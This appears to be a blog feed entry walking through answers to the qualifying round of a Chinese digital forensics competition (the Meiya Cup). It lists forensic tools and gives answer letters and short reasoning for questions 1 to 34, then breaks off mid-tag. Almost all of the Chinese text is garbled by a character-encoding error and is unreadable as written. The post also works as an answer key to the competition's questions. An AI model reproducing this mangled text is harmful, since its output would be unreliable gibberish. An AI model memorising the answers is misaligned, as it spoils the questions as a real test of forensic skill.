    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><a href="http://meiyacup.com/">â€œç¾äºšæ¯â€ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›</a>æ˜¯ç”±<strong>ä¸­å›½åˆ‘äº‹è­¦å¯Ÿå­¦é™¢ä¸»åŠã€å¦é—¨ç¾äºšæŸç§‘æ‰¿åŠçš„ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›</strong>ï¼Œä¹Ÿæ˜¯å›½å†…è¾ƒä¸ºæœ‰åçš„æ•°æ®å–è¯æ¯”èµ›</p><p>ä½œä¸ºç½‘å®‰ä¸“ä¸šçš„å°èŒæ–°å»å¹´å¯¹æ­¤æ¯«ä¸çŸ¥æƒ…ï¼ˆ<del>çŸ¥æƒ…äº†æˆ‘å¯èƒ½ä¹Ÿè¿‡ä¸äº†èµ„æ ¼èµ›</del>ï¼‰ï¼Œäºæ˜¯ä»Šå¹´æƒ³è¦å»ç©ç©ï¼ˆ<del>æŒ‡åˆ’æ°´</del>ï¼‰ï¼Œæ‰€ä»¥æ‰“ç®—è¶æ—¶é—´è¿˜å¤ŸæŠŠè¿‡å»çš„å‡ æ¬¡æ¯”èµ›çš„çœŸé¢˜ç»™åˆ·ä¸€åˆ·XD</p><blockquote><p>æ³¨ï¼šé¢˜ç›®ç‰ˆæƒå±äºç¾äºšæ¯èµ›äº‹ç»„å§”ä¼š</p></blockquote><span id="more"></span><blockquote><p>æ³¨ï¼šæœ¬äººæ„Ÿè§‰å–è¯æ¯”èµ›å°±æ˜¯ç†Ÿç»ƒè¿ç”¨å„ç§å·¥å…·çš„æ¯”èµ›â€¦ï¼ˆ <del>å–è¯è½¯ä»¶å…¬å¸çš„ç¡¬å¹¿</del></p></blockquote><h1 id="0x01-å·¥å…·"><a href="#0x01-å·¥å…·" class="headerlink" title="0x01.å·¥å…·"></a>0x01.å·¥å…·</h1><p><strong>ç¡¬ä»¶ï¼š</strong></p><ul><li>Microsoft Surface Book 2 </li><li>Samsung 1T SSD</li></ul><p><strong>è½¯ä»¶ï¼š</strong></p><ul><li>å–è¯å¤§å¸ˆ<strong>è¯•ç”¨ç‰ˆ</strong></li><li>AccessData FTK Imager</li><li>VMWare Workstation Pro 16</li><li>ç«çœ¼è¯æ®åˆ†æè½¯ä»¶V4ï¼ˆä»˜è´¹æˆæƒï¼‰</li><li>ç«çœ¼ä»¿çœŸå–è¯è½¯ä»¶ï¼ˆä»˜è´¹æˆæƒï¼‰</li><li>volatility</li><li>Dependency Worker</li></ul><h1 id="0x02-èµ„æ ¼èµ›-æ¡ˆæƒ…ä»‹ç»"><a href="#0x02-èµ„æ ¼èµ›-æ¡ˆæƒ…ä»‹ç»" class="headerlink" title="0x02.èµ„æ ¼èµ› - æ¡ˆæƒ…ä»‹ç»"></a>0x02.èµ„æ ¼èµ› - æ¡ˆæƒ…ä»‹ç»</h1><blockquote><p><img src="https://i.loli.net/2020/10/06/PRyuzoVedDlEBbw.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/mV2Duc9Cxh1YEAB.png" alt="image.png"></p></blockquote><h1 id="0x03-èµ„æ ¼èµ›-å•é¡¹é€‰æ‹©é¢˜"><a href="#0x03-èµ„æ ¼èµ›-å•é¡¹é€‰æ‹©é¢˜" class="headerlink" title="0x03.èµ„æ ¼èµ› - å•é¡¹é€‰æ‹©é¢˜"></a>0x03.èµ„æ ¼èµ› - å•é¡¹é€‰æ‹©é¢˜</h1><p>å¼€å±€è‡ªç„¶é¦–å…ˆæ˜¯æŠŠæƒ¯ä¾‹çš„ç«çœ¼+å–è¯å¤§å¸ˆè‡ªåŠ¨åˆ†æå¼„ä¸Š</p><p><img src="https://i.loli.net/2020/11/08/KBRG6INpJcWQm7l.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/2TM9mdyAQKv7suc.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/3oaWBnVihzy4Ppe.png" alt="image.png"></p><h2 id="1-A"><a href="#1-A" class="headerlink" title="1.A"></a>1.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/qVMl1dkrnNLmUSp.png" alt="image.png"></p></blockquote><p>è§å–è¯å¤§å¸ˆã€æ‘˜è¦ã€‘éƒ¨åˆ†</p><p><img src="https://i.loli.net/2020/11/08/8smWe5ScNfjGodn.png" alt="image.png"></p><h2 id="2-C"><a href="#2-C" class="headerlink" title="2.C"></a>2.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/8nRqtjkAaPy7XWB.png" alt="image.png"></p></blockquote><p>æ¯«æ— ç–‘é—®æ˜¯win10å®¶åº­ç‰ˆ</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><h2 id="3-D"><a href="#3-D" class="headerlink" title="3.D"></a>3.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/vlpjCBZxSq7EGwW.png" alt="image.png"></p></blockquote><p>ä»æ‘˜è¦ä¸­å¯ä»¥çœ‹å‡ºçŠ¯ç½ªå«Œç–‘äººçš„ç³»ç»Ÿç›˜æ˜¯NTFSï¼Œè€Œä»–ï¼ˆè¡¨é¢ä¸Šï¼‰åªæœ‰ä¸€ä¸ªç£ç›˜åˆ†åŒºï¼Œä»–åœ¨ä½¿ç”¨è‡ªå·±çš„è®¡ç®—æœºæ—¶çš„ç£ç›˜åˆ†åŒºå°±åº”å½“æ˜¯NTFSï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸è¦è¢«ä¸å¯è§çš„ESP<del>å¯„å­˜å™¨</del>åˆ†åŒºç»™è¿·æƒ‘äº†</p><p><img src="https://i.loli.net/2020/11/08/zSGfOjA9KoRy5WI.png" alt="image.png"></p><h2 id="4-A"><a href="#4-A" class="headerlink" title="4.A"></a>4.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/aIuSHi5AU9wvjXe.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯çœ‹æ‘˜è¦ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘è®¡ç®—å‡ºæ¥çš„å¤§å°æ¯”æ­£ç¡®ç­”æ¡ˆå¤š12ä¸ªæ‰‡åŒºâ€¦å¸Œæœ›åç»­èƒ½æœ‰å¤§å¸ˆå‚…ç­”ç–‘è§£æƒ‘</p><p><img src="https://i.loli.net/2020/11/08/zSGfOjA9KoRy5WI.png" alt="image.png"></p><h2 id="5-E"><a href="#5-E" class="headerlink" title="5.E"></a>5.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/ewm1G2gYvFKipTo.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/px3ir7P5VNG4nUb.png" alt="image.png"></p></blockquote><p><del>é¢˜ç›®é€‰é¡¹è¿˜æ˜¯åˆ†é¡µçš„ï¼Œæƒ³èµ·æ¥é«˜ä¸­è¢«å®Œå½¢å¡«ç©ºæ”¯é…çš„ææƒ§</del></p><p>å–è¯å¤§å¸ˆé‡Œä¸€æœå°±æœ‰</p><p><img src="https://i.loli.net/2020/11/08/ytvgSpiqGL9dhOH.png" alt="image.png"></p><h2 id="6-A"><a href="#6-A" class="headerlink" title="6.A"></a>6.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/hkrVHlmsMiPCvZX.png" alt="image.png"></p></blockquote><p>å®‰è£…æ—¶é—´åœ¨å–è¯å¤§å¸ˆé‡Œå¯ä»¥ç›´æ¥çœ‹åˆ°</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®é—®çš„æ—¶åŒºæ˜¯UTCï¼Œè€ŒçŠ¯ç½ªå«Œç–‘äººçš„ç”µè„‘æ—¶åŒºæ˜¯UTC+8ï¼ˆè§ç¬¬å…«é¢˜ï¼‰ï¼Œæ•…éœ€è¦å‡8h</p><h2 id="7-A"><a href="#7-A" class="headerlink" title="7.A"></a>7.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/HokGNJRiXczv2BM.png" alt="image.png"></p></blockquote><p><del>é—­ç€çœ¼ç›ä½ éƒ½åº”è¯¥çŸ¥é“åº”å½“æ˜¯512B</del></p><p>åœ¨å–è¯å¤§å¸ˆçš„ã€æ‘˜è¦ã€‘é‡Œå¯ä»¥çœ‹åˆ°æ˜¯512B</p><p><img src="https://i.loli.net/2020/11/08/k9lyASzja5rIBUb.png" alt="image.png"></p><h2 id="8-E"><a href="#8-E" class="headerlink" title="8.E"></a>8.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/sngBaJlLejNUf6Y.png" alt="_X5Q5M_7ZJ0MF6IGLD__Y1T.png"></p></blockquote><p>å¯ä»¥åœ¨å–è¯å¤§å¸ˆé‡Œçœ‹åˆ°æ˜¯utc+8</p><blockquote><p>çƒ­çŸ¥è¯†ï¼šGMT &#x3D; UTC + 0</p></blockquote><p><img src="https://i.loli.net/2020/11/08/rNYay8x2XWHDCnw.png" alt="image.png"></p><h2 id="9-D"><a href="#9-D" class="headerlink" title="9.D"></a>9.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/j4XRophErAiYNJz.png" alt="RZ0@`WRM@RV_UWVUQK0`U_G.png"></p></blockquote><p>å–è¯å¤§å¸ˆä¸€æ¢­å­å¸¦èµ°</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><h2 id="10-B"><a href="#10-B" class="headerlink" title="10.B"></a>10.B</h2><blockquote><p>![@_JFV_4J7~~DJ3TU__@&#96;_SS.png](<a href="https://i.loli.net/2020/11/08/BRtzZPJWxKVoSwp.png">https://i.loli.net/2020/11/08/BRtzZPJWxKVoSwp.png</a>)</p></blockquote><p>å–è¯å¤§å¸ˆé‡Œå¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹åˆ°å„ä¸ªç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="https://i.loli.net/2020/11/08/Eor5nGTclRdMu7i.png" alt="image.png"></p><h2 id="11-A"><a href="#11-A" class="headerlink" title="11.A"></a>11.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/Xr8C5ifZa2sUIyN.png" alt="J@@JH_BYA__II_OA__KI31A.png"></p></blockquote><p>è¿™é“é¢˜ç¨å¾®ç»•äº†ä¸€ä¸ªå¼¯</p><p>åœ¨å–è¯å¤§å¸ˆä¸­æˆ‘ä»¬çœ‹åˆ°çš„å”¯ä¸€æŒ‚è½½äº†ç›˜ç¬¦<code>E:</code>çš„è®¾å¤‡æ˜¯<code>Generic Flash Disk USB Device</code>ï¼Œåœ¨<strong>ç­”æ¡ˆä¸­å¹¶æ²¡æœ‰è¿™ä¸ªé€‰é¡¹</strong></p><p><img src="https://i.loli.net/2020/11/08/fnadqi4kLJyrAOW.png" alt="image.png"></p><p>ä¼—æ‰€å‘¨çŸ¥<code>Generic Flash Disk USB Device</code>æ˜¯<strong>é€šç”¨é—ªå­˜è®¾å¤‡</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´çŠ¯ç½ªå«Œç–‘äººæ’å…¥è¿‡ä¸€ä¸ªé—ªå­˜è®¾å¤‡ï¼Œ<strong>è¯¥è®¾å¤‡è¢«æŒ‚è½½åˆ°ç›˜ç¬¦E</strong></p><p>ä»è®¾å¤‡æ‹”æ’æ—¶é—´çº¿åˆ†æå¯çŸ¥å…¶ä»–çš„å­˜å‚¨è®¾å¤‡æ’å…¥æ—¶ä¹Ÿä¼š<strong>å…ˆä»ç›˜ç¬¦Eå¼€å§‹åˆ†é…èµ·ï¼Œè€Œäº”ä¸ªé€‰é¡¹ä¸­åªæœ‰Aè®¾å¤‡å‡ºç°åœ¨USBä½¿ç”¨è®°å½•ä¸­</strong>ï¼ˆå…¶å®å…‰å‡­è¿™ä¸€ç‚¹å°±èƒ½é€‰å‡ºAäº†â‘§</p><h2 id="12-C"><a href="#12-C" class="headerlink" title="12.C"></a>12.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/hblgrSTD1W6OJUu.png" alt="_9ICF__5RT1QZ40J8__GPOG.png"></p></blockquote><p>ç›´æ¥çœ‹ç”¨æˆ·ç—•è¿¹ä¸­å±äº<code>E:</code>ç›®å½•ä¸‹çš„å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®é—®çš„æ˜¯<strong>ã€ä¸æ˜¯ã€‘</strong></p><p><img src="https://i.loli.net/2020/11/08/s4Ulq6mvwDhZ8xT.png" alt="image.png"></p><h2 id="13-B"><a href="#13-B" class="headerlink" title="13.B"></a>13.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/fmRC3YGpiXtdMFc.png" alt="1_N~W50~N_P_NSKW0QQYI09.png"></p></blockquote><p>è¿˜æ˜¯åœ¨å–è¯å¤§å¸ˆé‡Œç¿»ä¸€åœˆã€æœ€è¿‘è®¿é—®çš„æ–‡æ¡£ã€‘å°±æœ‰äº†</p><h2 id="14-C"><a href="#14-C" class="headerlink" title="14.C"></a>14.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/2GmqBxbp9Fc7Ddy.png" alt="RKZ1H8C3JWUC_L~ZI_DQ07J.png"></p></blockquote><p>è¿˜æ˜¯ä¸€æœå°±æœ‰</p><p><img src="https://i.loli.net/2020/11/08/uYCcjKJ3SIFOtX4.png" alt="image.png"></p><h2 id="15-E"><a href="#15-E" class="headerlink" title="15.E"></a>15.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/7G3eVkayPg2R1zQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/PsK6SnMWNDmZBJG.png" alt="image.png"></p></blockquote><p>å…ˆç”¨å–è¯å¤§å¸ˆæ‰¾åˆ°æ–‡ä»¶æå–å‡ºæ¥ï¼Œæ‹–åˆ°Dependency Walkeré‡Œä¸€çœ‹å°±æœ‰äº†</p><p><del>éœ€è¦æ³¨æ„çš„æ˜¯ç”µè„‘æ€§èƒ½åƒæˆ‘è¿™æ ·å·®çš„ä¼šå¡æŒºä¹…</del></p><p><img src="https://i.loli.net/2020/11/08/aUnNPucL9WxqD36.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/QpnGT7cbEltfaPV.png" alt="NO0W6JSQ_~YMYYHM~83ZNWG.png"></p><p><img src="https://i.loli.net/2020/11/08/JkAPZYn5jKMgEs8.png" alt="MXJT487_GN18RTL5VM6N3DK.png"></p><p><img src="https://i.loli.net/2020/11/08/3SI4yLQ9KJV6aXO.png" alt="FE54D_XKB3~MW3X_PB_2~DQ.png"></p><p><img src="https://i.loli.net/2020/11/08/IRjCwQ2GVNaF6dc.png" alt="0KG93Q_T4_52I84_A12J3S1.png"></p><h2 id="16-C"><a href="#16-C" class="headerlink" title="16.C"></a>16.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/KS3VuExedglZrTC.png" alt="image.png"></p></blockquote><p>ä½¿ç”¨<strong>ç«çœ¼ä»¿çœŸ</strong>è¿›è™šæ‹Ÿæœºä¸€çœ‹å°±æ˜¯è“è‰²</p><p><img src="https://i.loli.net/2020/11/08/9DngTKf2Poa1SH7.png" alt="image.png"></p><h2 id="17-B"><a href="#17-B" class="headerlink" title="17.B"></a>17.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/r6ZzlAsdvR9gCa1.png" alt="image.png"></p></blockquote><p><del>é¦–å…ˆè¿™å‡ ä¸ªæ–‡ä»¶æˆ‘éƒ½æ²¡åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°</del></p><p>Windowsä¸­ç”¨æ¥åœ¨ä¼‘çœ çŠ¶æ€å‚¨å­˜å†…å­˜æ•°æ®çš„æ–‡ä»¶å°±æ˜¯<code>HIBERFIL.SYS</code>ï¼Œæ‰€ä»¥ç›´æ¥é€‰Bå³å¯ï¼Œæœ‰å…³è¿™ä¸ªæ–‡ä»¶çš„è¯¦æƒ…å¯ä»¥ç™¾åº¦åº·åº·</p><blockquote><p>å…³äºè¿™äº”ä¸ªæ–‡ä»¶çš„ç®€å•è¯´æ˜ï¼ˆæ¥è‡ªç™¾åº¦ï¼‰ï¼š</p><p>WIN386.SWPä¸ºè™šæ‹Ÿå†…å­˜äº¤æ¢æ–‡ä»¶ï¼Œå­˜æ”¾å†…å­˜ä¸­é•¿æ—¶é—´é—²ç½®çš„ç¨‹åº</p><p>HIBERFIL.SYSä¸ºå†…å­˜å¤‡ä»½æ–‡ä»¶ï¼Œç”µè„‘ä¼‘çœ æ—¶ä¼šå°†å†…å­˜æ‰€æœ‰å†…å®¹å†™å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿å”¤é†’æ—¶å¿«é€Ÿæ¢å¤</p><p>PAGEFILE.SYSä¸ºè™šæ‹Ÿå†…å­˜é¡µé¢æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿå†…å­˜</p><p>NTUSER.DATä¸ºç”¨æˆ·é…ç½®æ–‡ä»¶</p><p>SWAPFILE.SYSä¸ºMetro Appçš„è™šæ‹Ÿå†…å­˜äº¤æ¢æ–‡ä»¶ï¼Œæ¯”è¾ƒç”Ÿåƒ»</p></blockquote><h2 id="18-D"><a href="#18-D" class="headerlink" title="18.D"></a>18.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/LBuPonHgJKXkefZ.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯å¸¸è¯†ç±»é¢˜ç›®ï¼Œæœ‰å…³winçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µå¯ä»¥çœ‹<a href="https://www.300188.cn/news/sharing-show-2030.html">è¿™é‡Œ</a>å’Œ<a href="http://www.xlysoft.net/detail/7-314-2677.html">è¿™é‡Œ</a></p><h2 id="19-A"><a href="#19-A" class="headerlink" title="19.A"></a>19.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/FNkSt7cV3gqlIYD.png" alt="image.png"></p></blockquote><p>å–è¯å¤§å¸ˆæŸ¥çœ‹ç½‘ç»œè¿æ¥å³å¯</p><p><img src="https://i.loli.net/2020/11/08/iYtBJ5mcwx9lOeD.png" alt="image.png"></p><h2 id="20-E"><a href="#20-E" class="headerlink" title="20.E"></a>20.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/TCYFsKIGRexu78Z.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/dbY1IsgpnJwvRAM.png" alt="image.png"></p></blockquote><p>ç«çœ¼ä»¿çœŸé‡Œåˆ‡åˆ°Adminè´¦å·ä¸€çœ‹å°±æœ‰äº†</p><p><img src="https://i.loli.net/2020/11/08/PcxgAesSGuYjU5Z.png" alt="image.png"></p><h2 id="21-C"><a href="#21-C" class="headerlink" title="21.C"></a>21.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/dNqMpI6PSKHWFca.png" alt="image.png"></p></blockquote><p>ä¸€å¼€å§‹æ‰¾è¿™ä¸ªå¤‡ä»½ä¸€ç›´æ²¡å•¥æ€è·¯ï¼Œç›´åˆ°æˆ‘çœ‹åˆ°å–è¯å¤§å¸ˆé¦–é¡µå°±æœ‰åˆ†æç»“æœâ€¦</p><p><img src="https://i.loli.net/2020/11/08/v123y5nDbarIUQL.png" alt="image.png"></p><p><strong>å°†æ•´ä¸ªæ–‡ä»¶å¤¹å¯¼å‡º</strong>ï¼Œä½¿ç”¨<strong>ç«çœ¼è¯æ®åˆ†æè½¯ä»¶</strong>å’Œ<strong>å–è¯å¤§å¸ˆ</strong>è¿›è¡Œåˆ†æï¼Œå¼€å¯æˆ‘ä»¬ä¸‹ä¸€ä¸ªé˜¶æ®µçš„è§£é¢˜</p><p><img src="https://i.loli.net/2020/11/08/sRvJZxeDPql2yWt.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/jlVQhH3gISowOU7.png" alt="image.png"></p><p>åœ¨ç«çœ¼å½“ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºé¢˜ç›®ä¸­çš„iCloudçš„idä¸çŠ¯ç½ªå«Œç–‘äººçš„iCloudçš„idä¸åŒ</p><p><img src="https://i.loli.net/2020/11/09/Gc85FKXYtCjgQPx.png" alt="image.png"></p><h2 id="22-D"><a href="#22-D" class="headerlink" title="22.D"></a>22.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/sx271fmalKLpt6M.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯ç«çœ¼é‡Œå¯ä»¥ç›´æ¥æ‰¾å‡ºçš„å†…å®¹</p><p><img src="https://i.loli.net/2020/11/09/X5x78UW9c2vMLms.png" alt="image.png"></p><h2 id="23-A"><a href="#23-A" class="headerlink" title="23.A"></a>23.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/vA3eTsjQbJDKMBn.png" alt="image.png"></p></blockquote><p>è¿™ä¸€ä¸ªåœ¨<code>What&#39;s App</code>é‡Œçš„è”ç³»äººä¸­å¯ä»¥çœ‹åˆ°</p><p><img src="https://i.loli.net/2020/11/09/o85c7qgdbpsxyQD.png" alt="image.png"></p><h2 id="24-B"><a href="#24-B" class="headerlink" title="24.B"></a>24.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/qtSKxc48CAzUghk.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯åœ¨ç«çœ¼é‡Œï¼Œç²—ç•¥ç¿»ä¸€ç¿»å¯ä»¥å‘ç°é™¤äº†Bä»¥å¤–çš„éƒ½æœ‰æœè¿‡</p><h2 id="25-E"><a href="#25-E" class="headerlink" title="25.E"></a>25.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Q5unITJ9YRL2woA.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/FKmMYRJGLvpyfXr.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯ç§’å‡ºçš„<del>æ··åˆ†</del>é¢˜ï¼Œç«çœ¼ä¸€ç¿»å°±æœ‰</p><p><img src="https://i.loli.net/2020/11/09/K8vH96tISGFyi7u.png" alt="image.png"></p><h2 id="26-B"><a href="#26-B" class="headerlink" title="26.B"></a>26.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/1Y5pMoe8EaTzNs3.png" alt="image.png"></p></blockquote><p><del>é¦–å…ˆä»é€»è¾‘ä¸Šè¿›è¡Œåˆ†æå¦‚æœæ˜¯å’Œè€æ¿èŠæ´—é’±çš„è¯é‚£ä¹ˆåœ¨æ¡ˆæƒ…ç®€ä»‹ä¸Šå°±ä¼šæåˆ°è¿™ä»¶äº‹æƒ…è€Œä¸”æ•´ä¸ªæ¡ˆæƒ…ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–æ‰€ä»¥å¿…ç„¶æ²¡æœ‰èŠåˆ°è¿™ä¸ªè¯é¢˜</del></p><p>ä¸ä¸­ä»‹è°ˆä¹°æˆ¿ï¼š</p><p><img src="https://i.loli.net/2020/11/09/y9VFuvHe56CopLQ.png" alt="2020-11-9-20-19.png"></p><p>å’Œ å¸¦ é»‘ é˜” è¿› è¡Œ å˜¿ äº§ äº¤ æ˜“ï¼šï¼ˆåé¢è¿˜ä¼šæ¶‰åŠåˆ°è¿™ä¸ªï¼‰</p><p><img src="https://i.loli.net/2020/11/09/MJ7VFxysbo56lke.png" alt="image.png"></p><p>ä¸ç½‘è´·è°ˆå€Ÿé’±ï¼šï¼ˆå½“ç¨‹åºå‘˜ä¹Ÿå¤ªæƒ¨äº†ï¼Œæ²¡æœ‰å¤´å‘ä¹Ÿæ²¡æœ‰é’±QAQï¼‰</p><p><img src="https://i.loli.net/2020/11/09/OEIA8qm3Hxd7TCf.png" alt="image.png"></p><p>ä¸æœ‹å‹è°ˆç‚’æˆ¿ï¼šï¼ˆæˆ¿ä»·æ³¡æ²«å¿«ç ´â‘§ï¼ˆæ¼ï¼‰ï¼‰</p><p><img src="https://i.loli.net/2020/11/09/fjpLDlXOdr4GUkB.png" alt="image.png"></p><p>å¯ä»¥çœ‹å¾—å‡ºæ¥é™¤äº†æ´—é’±çš„å†…å®¹ä»¥å¤–éƒ½èŠåˆ°äº†</p><h2 id="27-C"><a href="#27-C" class="headerlink" title="27.C"></a>27.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Zux3Pa1jVwpUTdy.png" alt="å±å¹•æˆªå›¾ 2020-11-09 202807.png"></p></blockquote><p>å¯ä»¥åœ¨ç«çœ¼çš„å¾®ä¿¡èŠå¤©è®°å½•é‡Œå‘ç°<del>æ‰2000æ¡æ•°æ®å°±æ•¢å‡ºæ¥å–ï¼Ÿtoo young too simpleï¼</del></p><p><img src="https://i.loli.net/2020/11/09/KqoDBJfC3OIwTMQ.png" alt="image.png"></p><h2 id="28-D"><a href="#28-D" class="headerlink" title="28.D"></a>28.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/3XuvKxOydTsPpSA.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯åœ¨å¾®ä¿¡èŠå¤©è®°å½•é‡Œ<del>è¿™ä¹Ÿå¤ªä¾¿å®œäº†â‘§</del></p><p><img src="https://i.loli.net/2020/11/09/NvstWYFgewRJHBu.png" alt="image.png"></p><h2 id="29-D"><a href="#29-D" class="headerlink" title="29.D"></a>29.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/HmdsKoJxvSNQT6g.png" alt="image.png"></p></blockquote><p>è¿™ä¸€é“é¢˜ç¨å¾®æœ‰ä¸€ä¸¶ä¸¶ç»•ï¼Œåœ¨æ‰‹æœºå¤‡ä»½é‡Œæœ¬èº«çš„å›¾ç‰‡æ˜¯è£‚å›¾ï¼Œä½†æ˜¯<strong>åœ¨ç”µè„‘é•œåƒä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å«Œç–‘äººåœ¨ç”µè„‘ä¸Šä¹Ÿç™»å½•è¿‡è‡ªå·±çš„å¾®ä¿¡</strong>ï¼Œå› æ­¤æˆ‘ä»¬é‡æ–°å›ç”µè„‘é•œåƒé‡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªäº¤æ˜“çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2020/11/09/nItOfV4wazW9QFP.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ç”µè„‘ä¸Šæœ‰å¤šä¸ªBTCåœ°å€çš„å›¾ç‰‡<del>ï¼Œè¿˜å¥½å‡ºé¢˜äººæ²¡æœ‰å±‘åˆ°ä¸¤ä¸ªéƒ½æ”¾åœ¨ä¸€ä¸ªé€‰é¡¹é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€‰å‡ºæ¥</del></p><p><img src="https://i.loli.net/2020/11/09/Pn369pHERA8WNVy.png"></p><h2 id="30-E"><a href="#30-E" class="headerlink" title="30.E"></a>30.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Zg1JbciK5flae4N.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/MtfLODsUFl6YWTI.png" alt="image.png"></p></blockquote><p>è¿˜æ˜¯åœ¨å…¶ä¸  å¸¦ å˜¿ é˜”  çš„èŠå¤©è®°å½•é‡Œ</p><p><img src="https://i.loli.net/2020/11/09/BAfNIZ5g4EutFLe.png" alt="image.png"></p><h2 id="31-E"><a href="#31-E" class="headerlink" title="31.E"></a>31.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Cul2g3z8yoRq7Vf.png" alt="image.png"></p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶å‰é¢çš„èŠå¤©è®°å½•é‡Œè¯´åˆ°å¯†ç é€šè¿‡é‚®ç®±æ‰“è¿‡å»äº†ï¼Œä½†æ˜¯åé¢çš„èŠå¤©è®°å½•é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯é€šè¿‡é‚®ç®±å‘è¿‡å»çš„å¯†ç æ˜¯é”™è¯¯çš„ï¼Œæ­£ç¡®çš„å¯†ç è¿˜æ˜¯åœ¨å…¶ä¸  å¸¦ å˜¿ é˜”  çš„èŠå¤©è®°å½•é‡Œ</p><p><img src="https://i.loli.net/2020/11/09/dXOaZvzoENej9BJ.png" alt="image.png"></p><h2 id="32-A"><a href="#32-A" class="headerlink" title="32.A"></a>32.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/sHNX3tqrizm9E2p.png" alt="image.png"></p></blockquote><p>å¾ˆæ˜æ˜¾å°±æ˜¯Kevin<del>æ²¡æœ‰æš—ç¤ºæŸç¤¾äº¤åª’ä½“ä¸ŠæŸä¸ªç¾ğŸ•çš„æ„æ€</del></p><p><img src="https://i.loli.net/2020/11/09/NvstWYFgewRJHBu.png" alt="image.png"></p><h2 id="33-E"><a href="#33-E" class="headerlink" title="33.E"></a>33.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/CsY8PBOtNfFQe7c.png" alt="image.png"></p></blockquote><p>åœ¨èŠå¤©è®°å½•é‡Œå¯ä»¥çœ‹åˆ°æ˜¯Black Sheep<del>æ­¤å¤„è‰¾ç‰¹black watch</del></p><p><img src="https://i.loli.net/2020/11/09/cF4hnLylwfPQROa.png" alt="image.png"></p><h2 id="34-Dï¼Ÿ"><a href="#34-Dï¼Ÿ" class="headerlink" title="34.Dï¼Ÿ"></a>34.Dï¼Ÿ</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/C9gOn7Mzs5xHeyE.png" alt="image.png"></p></blockquote><p>ï¼ˆé—®å°±æ˜¯æ²¡æ‰¾åˆ°è¿™å¼ å›¾ï¼Œæˆ‘èœæ­»äº†</p><h2 id="35-B"><a href="#35-B" class="headerlink" 